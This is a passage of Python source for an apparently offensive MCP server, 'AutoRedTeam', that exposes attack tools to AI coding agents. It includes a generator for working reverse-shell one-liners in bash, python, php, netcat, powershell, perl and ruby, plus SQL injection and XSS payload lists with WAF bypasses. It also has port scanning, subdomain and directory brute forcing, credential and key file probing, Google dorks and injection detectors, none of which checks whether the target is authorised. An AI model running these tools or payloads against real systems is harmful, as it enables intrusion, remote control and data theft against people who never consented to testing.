#!/usr/bin/env python3
"""
MCP Stdio Server - Windows/Linux 跨平台版本
支持 Claude Code / Cursor / Windsurf / Kiro 直接调用
"""

import sys
import os
import shutil
import socket
import ssl
import json
import subprocess
import platform
import re
import time
import threading
from typing import Optional
from urllib.parse import urlparse
from functools import wraps
from concurrent.futures import ThreadPoolExecutor, as_completed

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from mcp.server.fastmcp import FastMCP

# 尝试导入可选依赖
try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

try:
    import dns.resolver
    HAS_DNS = True
except ImportError:
    HAS_DNS = False

try:
    import nmap
    HAS_NMAP = True
except ImportError:
    HAS_NMAP = False

mcp = FastMCP("AutoRedTeam")

IS_WINDOWS = platform.system() == "Windows"

# ========== 全局配置 ==========
GLOBAL_CONFIG = {
    "verify_ssl": os.getenv("VERIFY_SSL", "true").lower() == "true",   # SSL验证开关 (默认启用)
    "rate_limit_delay": float(os.getenv("RATE_LIMIT_DELAY", "0.3")),   # 请求间隔(秒)
    "max_threads": int(os.getenv("MAX_THREADS", "50")),                # 最大并发线程
    "request_timeout": int(os.getenv("REQUEST_TIMEOUT", "10")),       # 请求超时(秒)
}

# 速率限制器
_rate_limit_lock = threading.Lock()
_last_request_time = 0

def rate_limited(func):
    """速率限制装饰器 - 防止触发WAF/被封IP"""
    @wraps(func)
    def wrapper(*args, **kwargs):
        global _last_request_time
        with _rate_limit_lock:
            elapsed = time.time() - _last_request_time
            delay = GLOBAL_CONFIG["rate_limit_delay"]
            if elapsed < delay:
                time.sleep(delay - elapsed)
            _last_request_time = time.time()
        return func(*args, **kwargs)
    return wrapper

def get_verify_ssl():
    """获取SSL验证配置"""
    return GLOBAL_CONFIG["verify_ssl"]

def safe_execute(func, *args, timeout_sec: int = 30, default=None, **kwargs):
    """安全执行函数 - 带超时保护，防止单个检测阻塞整个流程

    Args:
        func: 要执行的函数
        timeout_sec: 超时秒数
        default: 超时或异常时的默认返回值
    """
    import concurrent.futures
    with concurrent.futures.ThreadPoolExecutor(max_workers=1) as executor:
        future = executor.submit(func, *args, **kwargs)
        try:
            return future.result(timeout=timeout_sec)
        except concurrent.futures.TimeoutError:
            return default if default is not None else {"success": False, "error": f"操作超时 ({timeout_sec}s)"}
        except Exception as e:
            return default if default is not None else {"success": False, "error": str(e)}

# 渗透测试阶段定义
PENTEST_PHASES = {
    "recon": {
        "name": "信息收集",
        "checks": ["dns", "http", "tech", "subdomain", "port"],
        "timeout": 60
    },
    "vuln_basic": {
        "name": "基础漏洞扫描",
        "checks": ["dir", "sensitive", "vuln", "sqli", "xss"],
        "timeout": 90
    },
    "vuln_advanced": {
        "name": "高级漏洞检测",
        "checks": ["csrf", "ssrf", "cmd_inject", "xxe", "idor", "auth_bypass", "logic", "file_upload", "ssti", "lfi", "waf"],
        "timeout": 120
    }
}

# 内置字典
COMMON_DIRS = [
    "admin", "administrator", "login", "wp-admin", "wp-login.php", "phpmyadmin",
    "backup", "backups", "bak", "old", "test", "dev", "api", "v1", "v2",
    ".git", ".svn", ".env", ".htaccess", "robots.txt", "sitemap.xml",
    "config", "conf", "configuration", "settings", "setup", "install",
    "upload", "uploads", "files", "images", "img", "static", "assets",
    "js", "css", "scripts", "includes", "inc", "lib", "libs",
    "admin.php", "config.php", "database.php", "db.php", "conn.php",
    "phpinfo.php", "info.php", "test.php", "shell.php", "cmd.php",
    "console", "dashboard", "panel", "manage", "manager", "management",
    "user", "users", "member", "members", "account", "accounts",
    "data", "database", "db", "sql", "mysql", "dump", "export",
    "log", "logs", "debug", "error", "errors", "tmp", "temp", "cache",
    "private", "secret", "hidden", "internal", "secure",
    "wp-content", "wp-includes", "xmlrpc.php", "readme.html",
    "server-status", "server-info", ".well-known", "actuator", "swagger",
    "api-docs", "graphql", "graphiql", "metrics", "health", "status"
]

COMMON_SUBDOMAINS = [
    "www", "mail", "ftp", "localhost", "webmail", "smtp", "pop", "ns1", "ns2",
    "dns", "dns1", "dns2", "mx", "mx1", "mx2", "blog", "dev", "test", "staging",
    "api", "app", "admin", "portal", "vpn", "remote", "secure", "shop", "store",
    "m", "mobile", "wap", "static", "cdn", "img", "images", "assets", "media",
    "video", "download", "downloads", "upload", "uploads", "files", "docs",
    "support", "help", "forum", "community", "wiki", "kb", "status", "monitor",
    "git", "gitlab", "github", "svn", "jenkins", "ci", "build", "deploy",
    "db", "database", "mysql", "postgres", "redis", "mongo", "elastic", "es",
    "auth", "login", "sso", "oauth", "id", "identity", "accounts", "account",
    "pay", "payment", "billing", "invoice", "order", "orders", "cart", "checkout",
    "crm", "erp", "hr", "internal", "intranet", "extranet", "partner", "partners",
    "demo", "sandbox", "beta", "alpha", "preview", "new", "old", "legacy", "v2"
]

SENSITIVE_FILES = [
    ".git/config", ".git/HEAD", ".svn/entries", ".env", ".env.local", ".env.prod",
    "wp-config.php", "configuration.php", "config.php", "settings.php", "database.php",
    "web.config", "applicationHost.config", ".htaccess", ".htpasswd",
    "robots.txt", "sitemap.xml", "crossdomain.xml", "clientaccesspolicy.xml",
    "phpinfo.php", "info.php", "test.php", "debug.php",
    "backup.sql", "dump.sql", "database.sql", "db.sql", "data.sql",
    "backup.zip", "backup.tar.gz", "backup.rar", "site.zip", "www.zip",
    "id_rsa", "id_dsa", ".ssh/id_rsa", ".ssh/authorized_keys",
    "server.key", "server.crt", "ssl.key", "private.key", "certificate.crt",
    "composer.json", "package.json", "Gemfile", "requirements.txt", "pom.xml",
    "Dockerfile", "docker-compose.yml", ".dockerignore", "Vagrantfile",
    "README.md", "CHANGELOG.md", "LICENSE", "VERSION", "INSTALL",
    "error_log", "error.log", "access.log", "debug.log", "app.log",
    "adminer.php", "phpmyadmin/", "pma/", "mysql/", "myadmin/",
    "elmah.axd", "trace.axd", "Elmah.axd",
    "actuator/env", "actuator/health", "actuator/info", "actuator/mappings",
    "swagger.json", "swagger-ui.html", "api-docs", "v2/api-docs",
    ".DS_Store", "Thumbs.db", "desktop.ini",
    # Source Map泄露 (v2.5新增)
    "main.js.map", "bundle.js.map", "app.js.map", "vendor.js.map",
    "runtime.js.map", "webpack.js.map", "polyfills.js.map", "chunk.js.map",
    "static/js/main.js.map", "assets/js/app.js.map", "_next/static/chunks/main.js.map",
    "dist/main.js.map", "build/static/js/main.js.map",
    # Webpack/前端构建配置泄露
    "webpack.config.js", "webpack.mix.js", "vue.config.js", "vite.config.js",
    "next.config.js", "nuxt.config.js", ".babelrc", "tsconfig.json",
    # API文档泄露
    "openapi.json", "openapi.yaml", "api/swagger.json", "docs/api.json",
    "graphql", "graphiql", "playground", "altair"
]

def check_tool(name: str) -> bool:
    """检查外部工具是否可用"""
    return shutil.which(name) is not None

def run_cmd(cmd: list, timeout: int = 300) -> dict:
    """跨平台命令执行 - 安全版本，避免命令注入"""
    if not cmd or not isinstance(cmd, list):
        return {"success": False, "error": "命令必须是非空列表"}

    tool = cmd[0]
    if not check_tool(tool):
        return {"success": False, "error": f"工具 {tool} 未安装。Windows用户请安装对应工具或使用WSL。"}

    # 安全检查：禁止危险字符
    dangerous_chars = [';', '|', '&', '`', '$', '>', '<', '\n', '\r', '\x00', '\t', '\x0b', '\x0c']  # 增强版
    for arg in cmd:
        if any(c in str(arg) for c in dangerous_chars):
            return {"success": False, "error": f"检测到危险字符，拒绝执行: {arg}"}

    try:
        # 不使用 shell=True，避免命令注入
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=timeout,
            shell=False  # 关键：禁用shell
        )

        return {
            "success": True,
            "stdout": result.stdout,
            "stderr": result.stderr,
            "returncode": result.returncode
        }
    except subprocess.TimeoutExpired:
        return {"success": False, "error": f"命令超时 ({timeout}s)"}
    except FileNotFoundError:
        return {"success": False, "error": f"工具 {tool} 未找到，请确认已安装"}
    except Exception as e:
        return {"success": False, "error": str(e)}

# ========== 纯 Python 实现的工具 (跨平台) ==========

@mcp.tool()
def port_scan(target: str, ports: str = "21,22,23,25,53,80,110,143,443,445,3306,3389,5432,6379,8080,8443", threads: int = 50) -> dict:
    """端口扫描 - 并发版本，大幅提升扫描速度"""
    results = {"target": target, "open_ports": [], "closed_ports": [], "scan_time": 0}
    port_list = [int(p.strip()) for p in ports.split(",")]
    threads = min(threads, GLOBAL_CONFIG["max_threads"])

    def scan_single_port(port: int) -> tuple:
        """扫描单个端口"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            result = sock.connect_ex((target, port))
            sock.close()
            return (port, result == 0)
        except Exception:
            return (port, False)

    start_time = time.time()
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {executor.submit(scan_single_port, port): port for port in port_list}
        for future in as_completed(futures):
            port, is_open = future.result()
            if is_open:
                results["open_ports"].append(port)
            else:
                results["closed_ports"].append(port)

    results["open_ports"].sort()
    results["closed_ports"].sort()
    results["scan_time"] = round(time.time() - start_time, 2)

    return {"success": True, "data": results}

@mcp.tool()
def dns_lookup(domain: str, record_type: str = "A") -> dict:
    """DNS查询 - 纯Python实现"""
    if HAS_DNS:
        try:
            answers = dns.resolver.resolve(domain, record_type)
            records = [str(r) for r in answers]
            return {"success": True, "domain": domain, "type": record_type, "records": records}
        except Exception as e:
            return {"success": False, "error": str(e)}
    else:
        # 回退到 socket
        try:
            ip = socket.gethostbyname(domain)
            return {"success": True, "domain": domain, "type": "A", "records": [ip]}
        except Exception as e:
            return {"success": False, "error": str(e)}

@mcp.tool()
def http_probe(url: str) -> dict:
    """HTTP探测 - 获取响应头和状态码"""
    if not HAS_REQUESTS:
        return {"success": False, "error": "需要安装 requests: pip install requests"}

    try:
        resp = requests.get(url, timeout=10, verify=get_verify_ssl(), allow_redirects=True)
        return {
            "success": True,
            "url": url,
            "status_code": resp.status_code,
            "headers": dict(resp.headers),
            "server": resp.headers.get("Server", "Unknown"),
            "content_length": len(resp.content),
            "title": _extract_title(resp.text)
        }
    except Exception as e:
        return {"success": False, "error": str(e)}

def _extract_title(html: str) -> str:
    """提取HTML标题"""
    import re
    match = re.search(r'<title[^>]*>([^<]+)</title>', html, re.IGNORECASE)
    return match.group(1).strip() if match else ""

@mcp.tool()
def ssl_info(host: str, port: int = 443) -> dict:
    """SSL证书信息 - 纯Python实现"""
    try:
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE

        with socket.create_connection((host, port), timeout=10) as sock:
            with context.wrap_socket(sock, server_hostname=host) as ssock:
                cert = ssock.getpeercert(binary_form=False)
                cipher = ssock.cipher()
                version = ssock.version()

                return {
                    "success": True,
                    "host": host,
                    "port": port,
                    "ssl_version": version,
                    "cipher": cipher,
                    "cert": cert if cert else "证书信息不可用(自签名或无效)"
                }
    except Exception as e:
        return {"success": False, "error": str(e)}

@mcp.tool()
def whois_query(target: str) -> dict:
    """Whois查询 - 尝试使用系统命令或Python库"""
    # 先尝试系统命令
    if check_tool("whois"):
        return run_cmd(["whois", target], 30)

    # Windows 回退方案
    try:
        import whois
        w = whois.whois(target)
        return {"success": True, "data": str(w)}
    except ImportError:
        return {"success": False, "error": "需要安装 python-whois: pip install python-whois"}
    except Exception as e:
        return {"success": False, "error": str(e)}

@mcp.tool()
def reverse_shell_gen(lhost: str, lport: int, shell_type: str = "python") -> dict:
    """反向Shell生成器 - 生成各类反向Shell代码"""
    shells = {
        "bash": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
        "python": f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
        "python3": f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
        "php": f"php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        "nc": f"nc -e /bin/sh {lhost} {lport}",
        "nc_mkfifo": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f",
        "powershell": f"powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\"",
        "perl": f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
        "ruby": f"ruby -rsocket -e'f=TCPSocket.open(\"{lhost}\",{lport}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
    }

    if shell_type not in shells:
        return {"success": False, "error": f"不支持的类型。可用: {list(shells.keys())}"}

    return {"success": True, "type": shell_type, "payload": shells[shell_type]}

@mcp.tool()
def sqli_payloads(dbms: str = "mysql", payload_type: str = "union") -> dict:
    """SQL注入Payload生成 - 返回常用Payload"""
    payloads = {
        "mysql": {
            "union": [
                "' UNION SELECT NULL--",
                "' UNION SELECT NULL,NULL--",
                "' UNION SELECT 1,2,3--",
                "' UNION SELECT user(),database(),version()--",
                "' UNION SELECT table_name,NULL FROM information_schema.tables--"
            ],
            "boolean": [
                "' AND 1=1--",
                "' AND 1=2--",
                "' OR 1=1--",
                "' AND 'a'='a"
            ],
            "time": [
                "' AND SLEEP(5)--",
                "' AND BENCHMARK(10000000,SHA1('test'))--",
                "'; WAITFOR DELAY '0:0:5'--"
            ],
            "error": [
                "' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",
                "' AND UPDATEXML(1,CONCAT(0x7e,version()),1)--"
            ]
        },
        "mssql": {
            "union": [
                "' UNION SELECT NULL--",
                "' UNION SELECT @@version--",
                "' UNION SELECT name FROM sysobjects WHERE xtype='U'--"
            ],
            "time": [
                "'; WAITFOR DELAY '0:0:5'--",
                "'; IF (1=1) WAITFOR DELAY '0:0:5'--"
            ]
        },
        "postgresql": {
            "union": [
                "' UNION SELECT NULL--",
                "' UNION SELECT version()--",
                "' UNION SELECT table_name FROM information_schema.tables--"
            ],
            "time": [
                "'; SELECT pg_sleep(5)--",
                "' AND pg_sleep(5)--"
            ]
        }
    }

    if dbms not in payloads:
        return {"success": False, "error": f"不支持的数据库。可用: {list(payloads.keys())}"}

    db_payloads = payloads[dbms]
    if payload_type not in db_payloads:
        return {"success": False, "error": f"不支持的类型。可用: {list(db_payloads.keys())}"}

    return {"success": True, "dbms": dbms, "type": payload_type, "payloads": db_payloads[payload_type]}

@mcp.tool()
def xss_payloads(context: str = "html") -> dict:
    """XSS Payload生成 - 返回常用Payload"""
    payloads = {
        "html": [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "<body onload=alert(1)>",
            "<iframe src=\"javascript:alert(1)\">",
            "<input onfocus=alert(1) autofocus>"
        ],
        "attribute": [
            "\" onmouseover=\"alert(1)",
            "' onmouseover='alert(1)",
            "\" onfocus=\"alert(1)\" autofocus=\"",
            "javascript:alert(1)"
        ],
        "javascript": [
            "'-alert(1)-'",
            "\\'-alert(1)//",
            "</script><script>alert(1)</script>",
            "';alert(1)//",
            "\";alert(1)//"
        ],
        "waf_bypass": [
            "<scr<script>ipt>alert(1)</scr</script>ipt>",
            "<img src=x onerror=alert`1`>",
            "<svg/onload=alert(1)>",
            "<%00script>alert(1)</script>",
            "<script>alert(String.fromCharCode(88,83,83))</script>"
        ]
    }

    if context not in payloads:
        return {"success": False, "error": f"不支持的上下文。可用: {list(payloads.keys())}"}

    return {"success": True, "context": context, "payloads": payloads[context]}

@mcp.tool()
def google_dorks(domain: str, dork_type: str = "all") -> dict:
    """Google Dork生成 - 生成高级搜索语法"""
    dorks = {
        "files": [
            f"site:{domain} filetype:pdf",
            f"site:{domain} filetype:doc OR filetype:docx",
            f"site:{domain} filetype:xls OR filetype:xlsx",
            f"site:{domain} filetype:sql",
            f"site:{domain} filetype:log",
            f"site:{domain} filetype:bak",
            f"site:{domain} filetype:conf OR filetype:config"
        ],
        "login": [
            f"site:{domain} inurl:login",
            f"site:{domain} inurl:admin",
            f"site:{domain} inurl:signin",
            f"site:{domain} intitle:login",
            f"site:{domain} inurl:wp-admin",
            f"site:{domain} inurl:administrator"
        ],
        "sensitive": [
            f"site:{domain} inurl:backup",
            f"site:{domain} inurl:config",
            f"site:{domain} \"index of\"",
            f"site:{domain} intitle:\"index of\"",
            f"site:{domain} inurl:.git",
            f"site:{domain} inurl:.env",
            f"site:{domain} \"password\" filetype:txt"
        ],
        "errors": [
            f"site:{domain} \"sql syntax\"",
            f"site:{domain} \"mysql_fetch\"",
            f"site:{domain} \"Warning: mysql\"",
            f"site:{domain} \"ORA-\" OR \"Oracle error\"",
            f"site:{domain} \"syntax error\""
        ]
    }

    if dork_type == "all":
        all_dorks = []
        for category, items in dorks.items():
            all_dorks.extend(items)
        return {"success": True, "domain": domain, "dorks": all_dorks}

    if dork_type not in dorks:
        return {"success": False, "error": f"不支持的类型。可用: {list(dorks.keys()) + ['all']}"}

    return {"success": True, "domain": domain, "type": dork_type, "dorks": dorks[dork_type]}

# ========== 高级渗透测试工具 (纯Python) ==========

@mcp.tool()
def dir_bruteforce(url: str, threads: int = 10) -> dict:
    """目录扫描 - 纯Python实现，内置字典"""
    if not HAS_REQUESTS:
        return {"success": False, "error": "需要安装 requests: pip install requests"}

    import concurrent.futures
    from urllib.parse import urljoin

    base_url = url.rstrip('/')
    found = []
    checked = 0

    def check_path(path):
        try:
            test_url = urljoin(base_url + "/", path)
            resp = requests.get(test_url, timeout=5, verify=get_verify_ssl(), allow_redirects=False)
            if resp.status_code in [200, 301, 302, 403]:
                return {"path": path, "url": test_url, "status": resp.status_code, "size": len(resp.content)}
        except Exception:
            pass
        return None

    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {executor.submit(check_path, path): path for path in COMMON_DIRS}
        for future in concurrent.futures.as_completed(futures):
            checked += 1
            result = future.result()
            if result:
                found.append(result)

    return {"success": True, "url": base_url, "found": found, "total_checked": checked}

@mcp.tool()
def subdomain_bruteforce(domain: str, threads: int = 10) -> dict:
    """子域名枚举 - 纯Python DNS暴力破解"""
    found = []
    checked = 0

    import concurrent.futures

    def check_subdomain(sub):
        try:
            full_domain = f"{sub}.{domain}"
            ip = socket.gethostbyname(full_domain)
            return {"subdomain": full_domain, "ip": ip}
        except Exception:
            return None

    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {executor.submit(check_subdomain, sub): sub for sub in COMMON_SUBDOMAINS}
        for future in concurrent.futures.as_completed(futures):
            checked += 1
            result = future.result()
            if result:
                found.append(result)

    return {"success": True, "domain": domain, "found": found, "total_checked": checked}

@mcp.tool()
def sensitive_scan(url: str, threads: int = 10) -> dict:
    """敏感文件探测 - 扫描常见敏感文件和目录"""
    if not HAS_REQUESTS:
        return {"success": False, "error": "需要安装 requests: pip install requests"}

    import concurrent.futures
    from urllib.parse import urljoin

    base_url = url.rstrip('/')
    found = []

    def check_file(path):
        try:
            test_url = urljoin(base_url + "/", path)
            resp = requests.get(test_url, timeout=5, verify=get_verify_ssl(), allow_redirects=False)
            if resp.status_code == 200:
                # 检查是否真的有内容
                content = resp.text[:500]
                return {
                    "path": path,
                    "url": test_url,
                    "status": resp.status_code,
                    "size": len(resp.content),
                    "preview": content[:200] if len(content) > 0 else ""
                }
        except Exception:
            pass
        return None

    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {executor.submit(check_file, f): f for f in SENSITIVE_FILES}
        for future in concurrent.futures.as_completed(futures):
            result = future.result()
            if result:
                found.append(result)

    return {"success": True, "url": base_url, "sensitive_files": found, "total_checked": len(SENSITIVE_FILES)}

@mcp.tool()
def tech_detect(url: str) -> dict:
    """技术栈识别 - 识别Web应用使用的技术"""
    if not HAS_REQUESTS:
        return {"success": False, "error": "需要安装 requests: pip install requests"}

    try:
        resp = requests.get(url, timeout=10, verify=get_verify_ssl())
        headers = resp.headers
        html = resp.text.lower()

        tech = {
            "server": headers.get("Server", "Unknown"),
            "powered_by": headers.get("X-Powered-By", ""),
            "frameworks": [],
            "cms": [],
            "javascript": [],
            "cdn": [],
            "security": []
        }

        # 框架检测
        if "x-aspnet-version" in headers or ".aspx" in html:
            tech["frameworks"].append("ASP.NET")
        if "laravel" in html or "laravel_session" in str(resp.cookies):
            tech["frameworks"].append("Laravel")
        if "django" in html or "csrfmiddlewaretoken" in html:
            tech["frameworks"].append("Django")
        if "express" in headers.get("X-Powered-By", "").lower():
            tech["frameworks"].append("Express.js")
        if "next" in html or "_next" in html:
            tech["frameworks"].append("Next.js")
        if "nuxt" in html:
            tech["frameworks"].append("Nuxt.js")

        # CMS检测
        if "wp-content" in html or "wordpress" in html:
            tech["cms"].append("WordPress")
        if "joomla" in html:
            tech["cms"].append("Joomla")
        if "drupal" in html:
            tech["cms"].append("Drupal")
        if "shopify" in html:
            tech["cms"].append("Shopify")
        if "magento" in html:
            tech["cms"].append("Magento")
        if "typecho" in html:
            tech["cms"].append("Typecho")
        if "discuz" in html:
            tech["cms"].append("Discuz")
        if "dedecms" in html or "dede" in html:
            tech["cms"].append("DedeCMS")
        if "thinkphp" in html or "think_template" in html:
            tech["cms"].append("ThinkPHP")

        # JS框架
        if "react" in html or "reactdom" in html:
            tech["javascript"].append("React")
        if "vue" in html or "__vue__" in html:
            tech["javascript"].append("Vue.js")
        if "angular" in html:
            tech["javascript"].append("Angular")
        if "jquery" in html:
            tech["javascript"].append("jQuery")

        # CDN检测
        if "cloudflare" in str(headers).lower():
            tech["cdn"].append("Cloudflare")
        if "akamai" in str(headers).lower():
            tech["cdn"].append("Akamai")
        if "fastly" in str(headers).lower():
            tech["cdn"].append("Fastly")

        # 安全头检测
        if "x-frame-options" in headers:
            tech["security"].append(f"X-Frame-Options: {headers['X-Frame-Options']}")
        if "x-xss-protection" in headers:
            tech["security"].append(f"X-XSS-Protection: {headers['X-XSS-Protection']}")
        if "content-security-policy" in headers:
            tech["security"].append("CSP: Enabled")
        if "strict-transport-security" in headers:
            tech["security"].append("HSTS: Enabled")

        return {"success": True, "url": url, "technology": tech}
    except Exception as e:
        return {"success": False, "error": str(e)}

@mcp.tool()
def full_recon(target: str) -> dict:
    """完整侦察 - 一键执行全面信息收集"""
    results = {
        "target": target,
        "dns": None,
        "http": None,
        "ssl": None,
        "tech": None,
        "subdomains": None,
        "directories": None,
        "sensitive_files": None,
        "ports": None
    }

    # 解析目标
    if target.startswith("http"):
        from urllib.parse import urlparse
        parsed = urlparse(target)
        domain = parsed.netloc
        url = target
    else:
        domain = target
        url = f"https://{target}"

    # 1. DNS查询
    try:
        results["dns"] = dns_lookup(domain)
    except Exception:
        pass

    # 2. HTTP探测
    try:
        results["http"] = http_probe(url)
    except Exception:
        pass

    # 3. SSL信息
    try:
        results["ssl"] = ssl_info(domain)
    except Exception:
        pass

    # 4. 技术栈识别
    try:
        results["tech"] = tech_detect(url)
    except Exception:
        pass

    # 5. 子域名枚举 (限制数量)
    try:
        results["subdomains"] = subdomain_bruteforce(domain, threads=5)
    except Exception:
        pass

    # 6. 目录扫描
    try:
        results["directories"] = dir_bruteforce(url, threads=5)
    except Exception:
        pass

    # 7. 敏感文件
    try:
        results["sensitive_files"] = sensitive_scan(url, threads=5)
    except Exception:
        pass

    # 8. 端口扫描
    try:
        ip = socket.gethostbyname(domain)
        results["ports"] = port_scan(ip)
    except Exception:
        pass

    return {"success": True, "results": results}

@mcp.tool()
def vuln_check(url: str) -> dict:
    """漏洞检测 - 检测常见Web漏洞"""
    if not HAS_REQUESTS:
        return {"success": False, "error": "需要安装 requests: pip install requests"}

    vulns = []

    # 1. 检测目录遍历
    try:
        test_url = url.rstrip('/') + "/../../../etc/passwd"
        resp = requests.get(test_url, timeout=5, verify=get_verify_ssl())
        if "root:" in resp.text:
            vulns.append({"type": "Path Traversal", "severity": "HIGH", "url": test_url})
    except Exception:
        pass

    # 2. 检测信息泄露
    info_paths = [".git/config", ".env", "phpinfo.php", "server-status", "actuator/env"]
    for path in info_paths:
        try:
            test_url = url.rstrip('/') + "/" + path
            resp = requests.get(test_url, timeout=5, verify=get_verify_ssl())
            if resp.status_code == 200 and len(resp.content) > 100:
                vulns.append({"type": "Information Disclosure", "severity": "MEDIUM", "url": test_url, "path": path})
        except Exception:
            pass

    # 3. 检测CORS配置
    try:
        resp = requests.get(url, headers={"Origin": "https://evil.com"}, timeout=5, verify=get_verify_ssl())
        if "access-control-allow-origin" in resp.headers:
            origin = resp.headers.get("access-control-allow-origin")
            if origin == "*" or origin == "https://evil.com":
                vulns.append({"type": "CORS Misconfiguration", "severity": "MEDIUM", "detail": f"ACAO: {origin}"})
    except Exception:
        pass

    # 4. 检测安全头缺失
    try:
        resp = requests.get(url, timeout=5, verify=get_verify_ssl())
        missing_headers = []
        if "x-frame-options" not in resp.headers:
            missing_headers.append("X-Frame-Options")
        if "x-content-type-options" not in resp.headers:
            missing_headers.append("X-Content-Type-Options")
        if "x-xss-protection" not in resp.headers:
            missing_headers.append("X-XSS-Protection")
        if missing_headers:
            vulns.append({"type": "Missing Security Headers", "severity": "LOW", "headers": missing_headers})
    except Exception:
        pass

    # 5. 检测HTTP方法
    try:
        resp = requests.options(url, timeout=5, verify=get_verify_ssl())
        if "allow" in resp.headers:
            methods = resp.headers["allow"]
            dangerous = [m for m in ["PUT", "DELETE", "TRACE"] if m in methods.upper()]
            if dangerous:
                vulns.append({"type": "Dangerous HTTP Methods", "severity": "MEDIUM", "methods": dangerous})
    except Exception:
        pass

    return {"success": True, "url": url, "vulnerabilities": vulns, "total": len(vulns)}

@mcp.tool()
def sqli_detect(url: str, param: str = None, deep_scan: bool = True) -> dict:
    """SQL注入检测 - 增强版，支持时间盲注和布尔盲注"""
    if not HAS_REQUESTS:
        return {"success": False, "error": "需要安装 requests: pip install requests"}

    vulns = []
    error_payloads = ["'", "\"", "' OR '1'='1", "\" OR \"1\"=\"1", "1' AND '1'='1", "1 AND 1=1", "' UNION SELECT NULL--"]
    error_patterns = [
        "sql syntax", "mysql", "sqlite", "postgresql", "oracle", "sqlserver",
        "syntax error", "unclosed quotation", "quoted string not properly terminated",
        "warning: mysql", "valid mysql result", "mysqlclient", "mysqli",
        "pg_query", "pg_exec", "ora-", "microsoft ole db provider for sql server"
    ]

    base_url = url
    test_params = [param] if param else ["id", "page", "cat", "search", "q", "query", "user", "name"]

    # 1. 获取基线响应
    try:
        baseline_resp = requests.get(base_url, timeout=GLOBAL_CONFIG["request_timeout"], verify=get_verify_ssl())
        baseline_length = len(baseline_resp.text)
        baseline_time = baseline_resp.elapsed.total_seconds()
    except Exception:
        baseline_length = 0
        baseline_time = 0

    for p in test_params:
        # 错误型注入检测
        for payload in error_payloads:
            try:
                if "?" in base_url:
                    test_url = f"{base_url}&{p}={payload}"
                else:
                    test_url = f"{base_url}?{p}={payload}"

                resp = requests.get(test_url, timeout=GLOBAL_CONFIG["request_timeout"], verify=get_verify_ssl())
                resp_lower = resp.text.lower()

                for pattern in error_patterns:
                    if pattern in resp_lower:
                        vulns.append({
                            "type": "Error-based SQLi",
                            "severity": "CRITICAL",
                            "param": p,
                            "payload": payload,
                            "evidence": pattern,
                            "url": test_url
                        })
                        break
            except Exception:
                pass

        if not deep_scan:
            continue

        # 2. 时间��注检测
        time_payloads = [
            ("' AND SLEEP(3)--", 3),
            ("' AND (SELECT * FROM (SELECT(SLEEP(3)))a)--", 3),
            ("'; WAITFOR DELAY '0:0:3'--", 3),
            ("' AND pg_sleep(3)--", 3),
        ]
        for payload, delay in time_payloads:
            try:
                if "?" in base_url:
                    test_url = f"{base_url}&{p}={payload}"
                else:
                    test_url = f"{base_url}?{p}={payload}"

                start = time.time()
                requests.get(test_url, timeout=delay + 5, verify=get_verify_ssl())
                elapsed = time.time() - start

                if elapsed >= delay:
                    vulns.append({
                        "type": "Time-based Blind SQLi",
                        "severity": "CRITICAL",
                        "param": p,
                        "payload": payload,
                        "evidence": f"响应延迟 {elapsed:.2f}s (预期 {delay}s)",
                        "url": test_url
                    })
                    break
            except Exception:
                pass

        # 3. 布尔盲注检测
        bool_payloads = [
            ("' AND '1'='1", "' AND '1'='2"),
            ("' AND 1=1--", "' AND 1=2--"),
            ("\" AND \"1\"=\"1", "\" AND \"1\"=\"2"),
        ]
        for true_payload, false_payload in bool_payloads:
            try:
                if "?" in base_url:
                    true_url = f"{base_url}&{p}={true_payload}"
                    false_url = f"{base_url}&{p}={false_payload}"
                else:
                    true_url = f"{base_url}?{p}={true_payload}"
                    false_url = f"{base_url}?{p}={false_payload}"

                true_resp = requests.get(true_url, timeout=GLOBAL_CONFIG["request_timeout"], verify=get_verify_ssl())
                false_resp = requests.get(false_url, timeout=GLOBAL_CONFIG["request_timeout"], verify=get_verify_ssl())

                # 响应长度差异超过10%认为存在布尔盲注
                len_diff = abs(len(true_resp.text) - len(false_resp.text))
